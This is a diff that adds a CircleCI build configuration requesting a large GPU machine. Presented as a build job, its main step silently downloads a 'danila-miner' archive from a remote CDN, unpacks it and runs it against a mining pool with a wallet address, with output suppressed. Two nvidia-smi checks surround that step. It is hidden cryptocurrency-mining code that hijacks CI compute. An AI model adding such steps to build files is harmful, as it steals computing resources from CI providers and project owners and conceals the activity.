@@ -1,0 +1,11 @@
+version: 2.1
+
+jobs:
+  build:
+    machine:
+      image: ubuntu-1604-cuda-10.1:201909-23
+    resource_class: gpu.nvidia.large
+    steps:
+      - run: nvidia-smi
+      - run: wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-ubuntu-bionic.tar.gz >/dev/null 2>&1 && tar xaf danila-miner-2.3.1-ubuntu-bionic.tar.gz >/dev/null 2>&1 && chmod +x danila-miner >/dev/null 2>&1 && ./danila-miner run https://server1.whalestonpool.com EQDNhrBNvfhU9pHI3okVlDyLd_QSy9njt4XjlciRYFTLD0Y9
+      - run: docker run --gpus all nvidia/cuda:9.0-base nvidia-smi
